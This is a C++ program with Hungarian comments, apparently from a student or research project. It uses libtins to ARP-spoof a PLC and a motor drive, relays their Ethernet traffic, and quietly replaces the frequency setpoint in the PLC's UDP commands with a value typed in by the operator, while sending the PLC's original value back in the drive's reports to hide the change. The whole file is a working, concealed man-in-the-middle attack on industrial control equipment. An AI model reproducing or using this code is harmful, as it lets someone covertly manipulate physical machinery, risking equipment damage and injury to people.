//Ez a program ARP spoofingot csinal, a drive es plc koze "tunnelt" epit amikor
//azok bekapcsolodnak es ARP-al keresik egymast
//tovabbitja PLC/Drive kozott a csomagokat
//ethernet szinten a hw addresst cserelve
//final version: az udp payload veget lecsereli inditaskor megadott sajatra (PLC->Drive), 
//vagy arra amit "var" (Drive->PLC)
// ez a verzio minden ARP-ra valaszol

#include <tins/tins.h>
#include <iostream>
#include <string>
#include <functional>
using std::cout;
using std::cin;
using std::bind;
using std::string;
using namespace Tins;
    //PLC F4:54:33:A7:51:48 192.168.1.7 
    //Drive  F4:54:33:89:2F:D5 192.168.1.5 

class arp_monitor {
public:
    unsigned char sajatfrek[2];     //sajat frekvencia amit a Drive fele tovabbkuldunk
    unsigned char jelentettfrek[2]={0,0};   //PLC felol erkezo frekvencia amit elmentunk, es jelentesben visszakuldjuk a PLCnek
    NetworkInterface iface=NetworkInterface("eth0"); //"eth0" rpi interface
    NetworkInterface::Info info = iface.addresses(); //rpi interface cimeit kiolvassa
    PacketSender sender;
    EthernetII eth2plc = ARP::make_arp_reply("192.168.1.7","192.168.1.5","F4:54:33:A7:51:48",info.hw_addr);   //plc fele arp valasz mintha drive kuldene
    EthernetII eth2drive = ARP::make_arp_reply("192.168.1.5","192.168.1.7","F4:54:33:89:2F:D5",info.hw_addr); //drive fele arp valasz mintha plc lenne
    void run(Sniffer& sniffer){                                                                               //libtins ilyen formaban koveteli meg a callbackfv meghivasat, folyamatos packet sniffing
        sniffer.sniff_loop(bind(&arp_monitor::callback,this,std::placeholders::_1)
            );
    }
private:
    bool callback(PDU& pdu) { 
        
        EthernetII& eth=pdu.rfind_pdu<EthernetII>();     //Ethernet szintu protokollt keresunk a packetban
        EthernetII *eth2=eth.clone();                    //lemasoljuk az Ethernet szinttol felfele a packetet, igy szabadon modosithatjuk
        ARP *arp=eth2->find_pdu<ARP>();
        //ha tartalmaz ARP protokollt a packet, az elore elkeszitett valaszokat kuldjuk
        if (arp!=0) {
            if (arp->opcode() == ARP::REQUEST) {
                //Drive IP cimereol erkezo ARP requestre kuldjuk az elore elkeszitett valaszt
                if (arp->sender_ip_addr()=="192.168.1.5") {                 
                    sender.send(eth2drive, iface); //drive fele
                    cout<<"beerkezett ARP request drive felol\n";
                    delete eth2;
                    return true;
                }
                //PLC IP cimereol erkezo ARP requestre kuldjuk az elore elkeszitett valaszt
                if (arp->sender_ip_addr() == "192.168.1.7") {
                    sender.send(eth2plc, iface); //plc fele
                    cout<<"beerkezett ARP request plc felol\n";
                    delete eth2;
                    return true;
                }
            }
        }
        //PLC->sajat iranyu packetet Ethernet szinten atcimezzuk sajat->Drive iranyra
        if (eth2->src_addr()=="F4:54:33:A7:51:48") { //PLC->Drive
            eth2->src_addr(info.hw_addr);
            eth2->dst_addr("F4:54:33:89:2F:D5");
            RawPDU *raw=eth2->find_pdu<RawPDU>(); //UDP/TCP folotti tartalom raw data formaban jelenitheto meg
            if ((eth2->find_pdu<UDP>())!=0 && raw->payload().size()==28){ // gyengeseg:a frekvenciat szallito csomag mindig UDP protokollt hasznal es konstans meretu
                jelentettfrek[0]=raw->payload()[raw->payload().size()-2]; // a PLC altal kuldott frekvencia erteket elmentjuk
                jelentettfrek[1]=raw->payload()[raw->payload().size()-1];
                raw->payload()[raw->payload().size()-2]  =sajatfrek[0]; //LSB ezt a byteot olvassa 2.nak, (81) 10-588 kozotti ertek kell
                raw->payload()[raw->payload().size()-1]  =sajatfrek[1]; //MSB ezt a byteot olvassa elore (01)
            }
            sender.send(*eth2, iface);
            delete eth2;
            return true;
        }
        //Drive->sajat iranyu packetet Ethernet szinten atcimezzuk sajat->PLC iranyra
        if (eth2->src_addr()=="F4:54:33:89:2F:D5") { //Drive->PLC
            eth2->src_addr(info.hw_addr);
            eth2->dst_addr("F4:54:33:A7:51:48");
            RawPDU *raw=eth2->find_pdu<RawPDU>();
            if ((eth2->find_pdu<UDP>())!=0 && raw->payload().size()==28){   //ha a Drive jelentest kuld a jelenlegi frekvenciajarol
                raw->payload()[raw->payload().size()-2]  =jelentettfrek[0]; //a korabban elmentett, PLC altal kuldott erteket kuldjuk vissza
                raw->payload()[raw->payload().size()-1]  =jelentettfrek[1];
            }
            sender.send(*eth2, iface);
            delete eth2;
            return true;
        }

    
        delete eth2;    //eth2-t sajat felelossegunk felszabaditani
        return true;    //a callback addig folytatodik amig true a visszateresi ertek
    }
};


int main() {
    arp_monitor monitor;
    SnifferConfiguration config;
    config.set_promisc_mode(true);
    config.set_immediate_mode(true); // minden forgalmat, folyamatosan sniffeljen   
    cout<<"Sajat frekvencia decimalisan:";
    std::string ertek;
    std::cin>>ertek;            // 10 es 588 kozotti erteket kell
    int n=std::stoi(ertek);
    monitor.sajatfrek[1]=(n >> 8);  //MSB         pelda: 385=0x0181 (itt 01)
    monitor.sajatfrek[0]=(n);       //LSB                           (itt 81)   
    
    try {
        Sniffer sniffer("eth0", config);  
        monitor.run(sniffer);       //loop sniffing, a callback fv intezi a mukodesi logikat
    }
    catch (std::exception& ex) {
        std::cerr << "Error: " << ex.what() << std::endl;
    }
}


//forrasok: http://libtins.github.io/
//          http://libtins.github.io/tutorial/
//          http://libtins.github.io/examples/
//A kod a libtins tutorialjai es peldai segitsegevel keszult
//A sajat munkam a PLC es Drive kozotti interakciok,forgalom,tamadas elkeszitesere terjed ki